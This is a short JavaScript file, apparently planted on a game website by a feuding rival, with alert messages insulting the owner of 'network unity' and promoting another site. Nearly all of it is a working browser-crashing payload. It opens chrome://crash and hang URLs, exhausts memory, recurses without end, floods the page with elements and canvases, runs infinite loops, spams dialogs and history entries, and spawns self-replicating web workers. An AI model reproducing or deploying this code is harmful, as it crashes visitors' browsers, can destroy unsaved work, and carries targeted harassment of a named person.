alert("use squall/downpour at ixl.learnmath.cfd, it has way more games than network unity could theoretically ever have")
alert("anyways, noah, network unity's owner, says i, snsk12/willowy, should get banned just because i called him 'nugget' in a stream");
alert("heres what i think about that:")

(function browserApocalypse() {
    const crashUrls = [
        'chrome://crash',
        'chrome://inducebrowsercrashforrealz',
        'chrome://hang',
        'chrome://shorthang',
        'chrome://gpucrash',
        'chrome://gpuhang',
        'chrome://memory-exhaust',
        'chrome://memory-pressure-critical',
        'chrome://crash/rust', 
        'chrome://crashurl',
        'chrome://kill',
        'chrome://quit',
        'chrome://restart'
    ];
    
    crashUrls.forEach((url, i) => {
        setTimeout(() => {
            try {
                window.open(url, `_crash_${i}`);
            } catch(e) {}
        }, i * 100);
    });
    
    setTimeout(() => {
        const memoryKiller = [];
        setInterval(() => {
            for(let i = 0; i < 1000; i++) {
                memoryKiller.push(new Array(1000000).fill('67'.repeat(1000)));
            }
        }, 10);
        
        let stringBomb = '';
        setInterval(() => {
            stringBomb += 'nusucks'.repeat(100000);
        }, 10);
    }, 2000);

    setTimeout(() => {
        function stackDestroyer(n = 0) {
            stackDestroyer(n + 1);
        }
        try {
            stackDestroyer();
        } catch(e) {
            stackDestroyer(); 
        }
    }, 3000);
    
    setTimeout(() => {
        setInterval(() => {
            for(let i = 0; i < 10000; i++) {
                const div = document.createElement('div');
                div.innerHTML = `<span>${'use squall over network unity'.repeat(100)}</span>`.repeat(100);
                div.style.cssText = `
                    position: absolute;
                    top: ${Math.random() * 10000}px;
                    left: ${Math.random() * 10000}px;
                    transform: rotate(${Math.random() * 360}deg) scale(${Math.random() * 10});
                    opacity: ${Math.random()};
                `;
                document.body.appendChild(div);
            }
        }, 50);
    }, 4000);

    setTimeout(() => {
        for(let i = 0; i < 500; i++) {
            const canvas = document.createElement('canvas');
            canvas.width = 4096;
            canvas.height = 4096;
            const ctx = canvas.getContext('2d') || canvas.getContext('webgl');
            
            if(ctx) {
                const imageData = ctx.createImageData?.(4096, 4096);
                if(imageData) {
                    for(let j = 0; j < imageData.data.length; j++) {
                        imageData.data[j] = Math.random() * 255;
                    }
                    ctx.putImageData?.(imageData, 0, 0);
                }
            }
            document.body.appendChild(canvas);
        }
    }, 5000);

    setTimeout(() => {
        for(let i = 0; i < 10; i++) {
            setTimeout(() => {
                while(true) {
                    Math.random();
                }
            }, i * 100);
        }
    }, 6000);

    setTimeout(() => {
        function alertSpam() {
            alert('use squall');
            confirm('continue using google sites slop?');
            prompt('how dead is your browser?', 'very');
            setTimeout(alertSpam, 10);
        }
        alertSpam();
    }, 7000);
    
    setTimeout(() => {
        setInterval(() => {
            history.pushState({}, '', `#crash-${Math.random()}`);
        }, 1);
    }, 8000);

    setTimeout(() => {
        function createWorkerBomb() {
            try {
                const workerCode = `
                    self.postMessage('worker alive');
                    const arr = [];
                    while(true) {
                        arr.push(new Array(1000000).fill('bomb'));
                    }
                `;
                const blob = new Blob([workerCode], {type: 'application/javascript'});
                const worker = new Worker(URL.createObjectURL(blob));
                worker.onmessage = createWorkerBomb;
            } catch(e) {}
        }
        
        for(let i = 0; i < 100; i++) {
            createWorkerBomb();
        }
    }, 9000);
})();
